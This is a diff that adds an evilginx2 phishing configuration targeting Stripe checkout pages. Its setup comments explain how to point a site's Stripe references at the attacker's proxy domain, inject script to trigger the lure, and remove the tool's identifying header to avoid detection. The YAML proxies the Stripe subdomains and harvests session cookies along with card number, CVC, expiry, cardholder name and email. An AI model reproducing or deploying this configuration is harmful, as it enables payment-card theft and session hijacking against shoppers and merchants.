@@ -1,0 +1,113 @@
+# Checkout Docs for reference
+# https://stripe.com/docs/connect/creating-a-payments-page?destination-or-on-behalf-of=destination
+
+# Steps to follow to integrate evilginx checkout in original payment checkout page
+#
+# 1) Replace all occurences of stripe.com in html files or in js files with evilginx2 domain
+# 2) Read docs for other possible issues (Mentioned Above)
+# 3) Also look at domain name stripe.network and change it with evilginx domain in all js and html files in checkout page of website.
+# 4) Handling lure is difficult and will require a heavy evilginx2 source code modification, Alternate solution is to inject js in the website index or any page which will trigger the evilginx2 lure and create a valid evilginx session for that user.
+# 
+
+
+
+# Checkout Page -
+#
+# https://checkout.stripe.com/c/pay/cs_live_b1VLOZemyS8VFjpL7CKqeF83LqaFkITaQd2uWgK0fdZ4D2qF5PBtN9itwh#fidkdWxOYHwnPyd1blppbHNgWmM0dDRLQF9IYDxNQ2c2U3VsYUZVfDJDYycpJ2hsYXYnP34nYnBsYSc%2FJ0tEJyknaHBsYSc%2FJzw9ZDw8MWRkKGY8MGcoMTQyPChkMGNgKDcwPDQwNTA2MzVgN2M3YGdmNycpJ3ZsYSc%2FJzZjZ2NkZDA9KGQ8YWAoMTVjZihnNzA9KDwxYDAzNzAwNjQ8ZzAzN2YwMid4KSdnYHFkdic%2FXlgpJ2lkfGpwcVF8dWAnPydocGlxbFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKnJycitof3ZubGsrZmpoJ3gl
+
+
+## List of SubDomains ---
+# https://m.stripe.com
+# https://m.stripe.network/
+# https://js.stripe.com
+# https://q.stripe.com
+# https://api.stripe.com/
+# https://r.stripe.com/
+# https://stripe-camo.global.ssl.fastly.net/
+# https://checkout.stripe.com
+
+
+
+
+
+# Note: Do not Forget to remove the easter egg codes from evilginx2 (http_proxy.go),
+# Search for 'cantFindMe' and 'egg' in http_proxy.go and comment all relevent code to remove the evilginx header (X-Evilginx)
+
+
+name: 'stripe'
+author: '@an0nud4y'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'stripe.com', session: true, auto_filter: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.network', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'q', orig_sub: 'q', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'r', orig_sub: 'r', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'stripe-camo.global.ssl', orig_sub: 'stripe-camo.global.ssl', domain: 'fastly.net', session: false, auto_filter: true, is_landing:false}
+
+sub_filters:
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.stripe.com'
+    keys: ['.*,regexp'] 
+  - domain: 'm.stripe.com'
+    keys: ['.*,regexp']       
+  - domain: 'stripe.com'
+    keys: ['.*,regexp'] 
+
+credentials:
+  username:
+    key: 'card[number]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'card[cvc]'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'type'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[number]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[cvc]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[exp_month]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[exp_year]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'billing_details[name]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'billing_details[email]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'guid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'muid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'payment_user_agent'
+      search: '(.*)'
+      type: 'post'
+
+     
+auth_urls:
+  - '/'
+  - '/c'
+  
+login:
+  domain: 'checkout.stripe.com'
+  path: '/' 
